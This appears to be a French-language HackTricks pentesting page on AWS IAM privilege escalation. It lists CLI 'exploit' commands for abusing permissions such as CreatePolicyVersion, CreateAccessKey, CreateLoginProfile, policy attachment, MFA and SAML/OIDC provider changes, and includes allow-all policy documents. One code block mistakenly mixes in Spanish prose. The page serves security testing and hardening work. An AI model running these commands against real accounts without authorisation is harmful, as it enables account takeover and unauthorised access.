# AWS - IAM Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## IAM

Pour plus d'informations sur IAM, consultez :

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### **`iam:CreatePolicyVersion`**

Accorde la capacité de créer une nouvelle version d'une IAM policy, en contournant la nécessité de la permission `iam:SetDefaultPolicyVersion` grâce au flag `--set-as-default`. Cela permet de définir des permissions personnalisées.

**Commande d'exploitation :**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Impact :** Escalade directement les privilèges en permettant toute action sur n'importe quelle ressource.

### **`iam:SetDefaultPolicyVersion`**

Permet de changer la version par défaut d'une politique IAM pour une autre version existante, ce qui peut escalader les privilèges si la nouvelle version possède davantage d'autorisations.

**Commande Bash :**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Impact:** Escalade de privilèges indirecte en permettant davantage de permissions.

### **`iam:CreateAccessKey`, (`iam:DeleteAccessKey`)**

Permet de créer un access key ID et un secret access key pour un autre utilisateur, conduisant à une possible escalade de privilèges.

**Exploit:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Impact :** Escalade de privilèges directe en assumant les permissions étendues d'un autre utilisateur.

Notez qu'un utilisateur ne peut avoir que 2 clés d'accès créées, donc si un utilisateur a déjà 2 clés d'accès, vous aurez besoin de la permission `iam:DeleteAccessKey` pour en supprimer une afin de pouvoir en créer une nouvelle :
```bash
aws iam delete-access-key --uaccess-key-id <key_id>
```
### **`iam:CreateVirtualMFADevice` + `iam:EnableMFADevice`**

Si vous pouvez créer un nouvel appareil MFA virtuel et l'activer sur un autre utilisateur, vous pouvez effectivement inscrire votre propre MFA pour cet utilisateur, puis demander une session validée par MFA pour ses identifiants.

**Exploit:**
```bash
# Create a virtual MFA device (this returns the serial and the base32 seed)
aws iam create-virtual-mfa-device --virtual-mfa-device-name <mfa_name>

# Generate 2 consecutive TOTP codes from the seed, then enable it for the user
aws iam enable-mfa-device --user-name <target_user> --serial-number <serial> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Impact :** Escalade de privilèges directe en prenant le contrôle de l'inscription MFA d'un utilisateur (puis en utilisant ses permissions).

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

Permet de créer ou de mettre à jour un profil de connexion, y compris de définir des mots de passe pour la connexion à la console AWS, entraînant une escalade de privilèges directe.

**Exploit pour la création :**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Exploit pour Update:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Impact:** Escalade directe de privilèges en se connectant en tant que "n'importe quel" utilisateur.

### **`iam:UpdateAccessKey`**

Permet d'activer une access key désactivée, pouvant mener à un accès non autorisé si l'attaquant possède la clé désactivée.

**Exploit:**
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
**Impact:** Escalade directe de privilèges en réactivant des clés d'accès.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Permet de générer ou de réinitialiser des identifiants pour des services AWS spécifiques (par ex., CodeCommit, Amazon Keyspaces), en héritant des permissions de l'utilisateur associé.

**Exploit for Creation:**
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
**Exploit pour réinitialisation :**
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
**Impact:** Escalade directe de privilèges au sein des permissions de service de l'utilisateur.

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Permet d'attacher des policies aux users ou groups, escaladant directement les privilèges en héritant des permissions de la policy attachée.

**Exploit pour l'utilisateur :**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Exploit pour le groupe :**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Impact:** Escalade de privilèges directe vers tout ce que la politique accorde.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Permet d'attacher ou d'ajouter des politiques aux rôles, utilisateurs ou groupes, permettant une escalade directe des privilèges en accordant des autorisations supplémentaires.

**Exploit pour le rôle :**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Exploit pour Inline Policies:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
Vous pouvez utiliser une policy comme :
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}
```
**Impact :** Escalade directe de privilèges en ajoutant des autorisations via des policies.

### **`iam:AddUserToGroup`**

Permet de s'ajouter à un groupe IAM, entraînant une escalade des privilèges en héritant des autorisations du groupe.

**Exploit:**
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
**Impact :** Escalade de privilèges directe au niveau des permissions du groupe.

### **`iam:UpdateAssumeRolePolicy`**

Permet de modifier le document de stratégie d'assume role d'un rôle, permettant d'assumer ce rôle et d'obtenir ses permissions associées.

**Exploit:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Lorsque la politique ressemble à ce qui suit, ce qui donne à l'utilisateur l'autorisation d'assumer le rôle :
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Impact :** Escalade de privilèges directe en assumant les permissions de n'importe quel rôle.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

Permet de téléverser une clé publique SSH pour l'authentification à CodeCommit et de désactiver des dispositifs MFA, conduisant à une escalade de privilèges indirecte potentielle.

**Exploit pour le téléversement de clé SSH :**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Exploit pour la désactivation de la MFA:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Impact :** Escalade de privilèges indirecte en activant l'accès CodeCommit ou en désactivant la protection MFA.

### **`iam:ResyncMFADevice`**

Permet la resynchronisation d'un dispositif MFA, pouvant entraîner une escalade de privilèges indirecte en manipulant la protection MFA.

**Commande Bash :**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Impact :** Escalade de privilèges indirecte en ajoutant ou en manipulant des appareils MFA.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Avec ces permissions, vous pouvez **modifier les métadonnées XML de la connexion SAML**. Ensuite, vous pourriez abuser de la **fédération SAML** pour **login** avec n'importe quel **role qui lui fait confiance**.

Notez qu'en faisant cela, **les utilisateurs légitimes ne pourront pas login**. Cependant, vous pouvez obtenir le XML, le remplacer par le vôtre, login et reconfigurer l'accès précédent.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
> [!NOTE]
> TODO : Un outil capable de générer les métadonnées SAML et de se connecter avec un rôle spécifié

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Incertain à ce sujet) Si un attaquant possède ces **permissions**, il pourrait ajouter un nouveau **Thumbprint** pour parvenir à se connecter à tous les rôles faisant confiance au provider.
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
### `iam:PutUserPermissionsBoundary`

Cette permission permet à un attaquant de mettre à jour le permissions boundary d’un utilisateur, ce qui peut entraîner une élévation de privilèges en lui permettant d’exécuter des actions normalement restreintes par ses permissions existantes.
```bash
aws iam put-user-permissions-boundary \
--user-name <nombre_usuario> \
--permissions-boundary arn:aws:iam::<cuenta>:policy/<nombre_politica>

Un ejemplo de una política que no aplica ninguna restricción es:


{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "BoundaryAllowAll",
"Effect": "Allow",
"Action": "*",
"Resource": "*"
}
]
}
```
### `iam:PutRolePermissionsBoundary`

Un acteur disposant de iam:PutRolePermissionsBoundary peut définir une limite d'autorisations sur un rôle existant. Le risque survient lorsqu'une personne ayant cette permission modifie la limite d'un rôle : elle peut restreindre de manière inappropriée des opérations (provoquant une interruption de service) ou, si elle associe une limite permissive, augmenter effectivement ce que le rôle peut faire et élever ses privilèges.
```bash
aws iam put-role-permissions-boundary \
--role-name <Role_Name> \
--permissions-boundary arn:aws:iam::111122223333:policy/BoundaryPolicy
```
## Références

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{{#include ../../../../banners/hacktricks-training.md}}
